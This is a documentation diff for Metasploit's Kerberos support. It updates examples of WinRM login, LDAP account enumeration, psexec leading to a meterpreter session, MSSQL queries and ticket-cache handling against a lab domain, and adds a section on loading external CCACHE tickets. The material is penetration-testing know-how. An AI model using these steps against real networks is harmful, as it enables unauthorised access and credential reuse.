@@ -17,7 +17,7 @@ Metasploit currently offers Kerberos authentication for the following services -
 
 Open a WinRM session:
 
-```
+```msf
 msf6 > use auxiliary/scanner/winrm/winrm_login
 msf6 auxiliary(scanner/winrm/winrm_login) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd winrm::auth=kerberos domaincontrollerrhost=192.168.123.13 winrm::rhostname=dc3.demo.local domain=demo.local
 
@@ -42,7 +42,7 @@ C:\Users\Administrator>
 
 Query LDAP for accounts:
 
-```
+```msf
 msf6 > use auxiliary/gather/ldap_query
 msf6 auxiliary(gather/ldap_query) > run action=ENUM_ACCOUNTS rhost=192.168.123.13 username=Administrator password=p4$$w0rd ldap::auth=kerberos ldap::rhostname=dc3.demo.local domain=demo.local domaincontrollerrhost=192.168.123.13
 [*] Running module against 192.168.123.13
@@ -60,15 +60,25 @@ CN=Administrator CN=Users DC=adf3 DC=local
  Name                Attributes
  ----                ----------
  badpwdcount         0
- pwdlastset          133184302034979121
+ description         Built-in account for administering the computer/domain
+ lastlogoff          1601-01-01 00:00:00 UTC
+ lastlogon           2023-01-23 11:02:49 UTC
+ logoncount          159
+ memberof            CN=Group Policy Creator Owners,CN=Users,DC=domain,DC=local || CN=Domain Admins,CN=Users,DC=domain,DC=local |
+                     | CN=Enterprise Admins,CN=Users,DC=domain,DC=local || CN=Schema Admins,CN=Users,DC=domain,DC=local || CN=Adm
+                     inistrators,CN=Builtin,DC=domain,DC=local
+ name                Administrator
+ objectsid           S-1-5-21-3402587289-1488798532-3618296993-500
+ pwdlastset          133189448681297271
  samaccountname      Administrator
  useraccountcontrol  512
+
  ... etc ...
 ```
 
 Running psexec against a host:
 
-```
+```msf
 msf6 > use exploit/windows/smb/psexec
 msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local
 
@@ -91,7 +101,7 @@ meterpreter >
 
 Connect to a Microsoft SQL Server instance and run a query:
 
-```
+```msf
 msf6 > use auxiliary/admin/mssql/mssql_sql
 msf6 auxiliary(admin/mssql/mssql_sql) > run 192.168.123.13 domaincontrollerrhost=192.168.123.13 username=administrator password=p4$$w0rd mssql::auth=kerberos mssql::rhostname=dc3.demo.local mssqldomain=demo.local sql='select auth_scheme from sys.dm_exec_connections where session_id=@@spid'
 [*] Reloading module...
@@ -137,7 +147,7 @@ Optional options:
 When a write-enabled `KrbCacheMode` is used, tickets that are issued to Metasploit will be stored for reuse. The `klist`
 command can be used to view tickets. It is a top level command and can be run even if a module is in use.
 
-```
+```msf
 msf6 > klist
 Kerberos Cache
 ==============
@@ -154,7 +164,7 @@ host            principal               sname                              issue
 
 More detailed information can be displayed by using the verbose (`-v` / `--verbose`) option.
 
-```
+```msf
 msf6 > klist -v
 Kerberos Cache
 ==============
@@ -196,15 +206,17 @@ The `klist` command can also be used for deleting tickets from the cache.
 Metasploit stores tickets for future use in a user configurable way as controlled by the `KrbCacheMode` datastore
 option. When a user attempts to use Kerberos to authenticate to a remote service such as SMB, if the cache mode is
 read-enabled (e.g. set to `read-only` or `read-write`) and Metasploit is connected to a database, it will attempt to
-fetch an existing ticket using the following steps.
+fetch an existing ticket using the following steps targeting SMB for example purposes.
 
-1. First Metasploit will use the datastore options, including the target host and username to search though the stored
-   tickets for an SMB-specific Ticket Granting Service (TGS). If one is found, it will be used. Tickets that are expired
-   will not be used.
-2. If no TGS is found, Metasploit will repeat the search process looking for a Ticket Granting Ticket (TGT). If one is
+1. If an external ticket is specified in the `${Prefix}::Krb5Ccname` option, that ticket will be used instead of the
+   cache.
+2. When using the cache, Metasploit will first use the datastore options, including the target host and username to 
+   search though the stored tickets for an SMB-specific Ticket Granting Service (TGS). If one is found, it will be used. 
+   Tickets that are expired will not be used.
+3. If no TGS is found, Metasploit will repeat the search process looking for a Ticket Granting Ticket (TGT). If one is
    found, it will be used to contact the Key Distribution Center (KDC) and request a TGS for authentication to the SMB
    service.
-3. If no TGT is found, Metasploit will contact the KDC and authenticate using the username and password from the
+4. If no TGT is found, Metasploit will contact the KDC and authenticate using the username and password from the
    datastore to request a TGT then an SMB-specific TGS before authenticating to the SMB service.
 
 If the cache mode is write-enabled (e.g. set to `write-only` or `read-write`) then any ticket, either TGT or TGS that is
@@ -221,7 +233,7 @@ When a ticket (either TGT or TGS) is stored, it is saved along with the other lo
 CCACHE files can be viewed with the `loot --type mit.kerberos.ccache` command (the `--type` argument filters for the
 specified type).
 
-```
+```msf
 msf6 auxiliary(admin/dcerpc/icpr_cert) > loot --type mit.kerberos.ccache
 
 Loot
@@ -253,5 +265,19 @@ Server UserPath: c:\
 Simultaneous Users: 16777216
 #
 ```
+
+## Using external tickets with Metasploit
+A ticket obtained outside of Metasploit can be used for authentication by setting the `${Prefix}::Krb5Ccname` option
+which is prioritized over the cache. This file must be in the [MIT Credential Cache][1] (CCACHE) file formath. If the
+ticket is in the Kirbi format, it must first be converted using the `auxiliary/admin/kerberos/ticket_converter` module.
+
+When an explicit CCACHE file is specified to load a ticket from, Metasploit will first attempt to load a TGS ticket
+from the file. If the service class of the `sname` component does not match the necessary value (e.g. the sname is for
+`HOST/dc.msflab.local` instead of `CIFS/dc.msflab.local`), the value will be patched automatically. If no TGS is found,
+Metasploit will attempt to load a TGT from the file and use it to contact the KDC and issue a TGS which will be stored
+for future use when the cache is write-enabled.
+
+It is important to set the `${Prefix}::Rhostname` and `${Prefix}Domain` options correctly because they are used to
+select the appropriate ticket from the file.
 
 [1]: http://web.mit.edu/KERBEROS/krb5-devel/doc/formats/ccache_file_format.html
